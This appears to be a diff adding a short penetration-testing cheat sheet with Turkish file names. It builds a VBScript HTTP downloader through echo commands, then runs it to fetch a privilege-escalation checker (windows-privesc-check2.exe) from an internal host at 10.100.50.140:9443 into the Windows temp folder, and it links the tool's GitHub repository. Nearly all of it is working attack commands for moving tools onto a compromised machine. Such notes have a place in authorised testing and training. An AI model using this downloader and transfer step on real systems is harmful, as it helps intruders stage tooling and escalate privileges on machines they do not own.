@@ -1,0 +1,36 @@
+# Create VBS File for windows client file download 
+
+echo strUrl = WScript.Arguments.Item(0) > WindowsWgetAraci.vbs
+echo StrFile = WScript.Arguments.Item(1) >> WindowsWgetAraci.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> WindowsWgetAraci.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> WindowsWgetAraci.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> WindowsWgetAraci.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> WindowsWgetAraci.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> WindowsWgetAraci.vbs
+echo Err.Clear >> WindowsWgetAraci.vbs
+echo Set http = Nothing >> WindowsWgetAraci.vbs
+echo Set http = CreateObject(“WinHttp.WinHttpRequest.5.1”) >> WindowsWgetAraci.vbs
+echo If http Is Nothing Then Set http = CreateObject(“WinHttp.WinHttpRequest”) >> WindowsWgetAraci.vbs
+echo If http Is Nothing Then Set http = CreateObject(“MSXML2.ServerXMLHTTP”) >> WindowsWgetAraci.vbs
+echo If http Is Nothing Then Set http = CreateObject(“Microsoft.XMLHTTP”) >> WindowsWgetAraci.vbs
+echo http.Open “GET”, strURL, False >> WindowsWgetAraci.vbs
+echo http.Send >> WindowsWgetAraci.vbs
+echo varByteArray = http.ResponseBody >> WindowsWgetAraci.vbs
+echo Set http = Nothing >> WindowsWgetAraci.vbs
+echo Set fs = CreateObject(“Scripting.FileSystemObject”) >> WindowsWgetAraci.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> WindowsWgetAraci.vbs
+echo strData = “” >> WindowsWgetAraci.vbs
+echo strBuffer = “” >> WindowsWgetAraci.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> WindowsWgetAraci.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> WindowsWgetAraci.vbs
+echo Next >> WindowsWgetAraci.vbs
+echo ts.Close >> WindowsWgetAraci.vbs
+
+type WindowsWgetAraci.vbs
+
+How start command : cscript WindowsWgetAraci.vbs http://10.100.50.140:9443/windows-privesc-check2.exe %TEMP%\YetkiYukseltmeZafiyetiAra.exe
+
+# Github
+
+https://github.com/pentestmonkey/windows-privesc-check.git
+
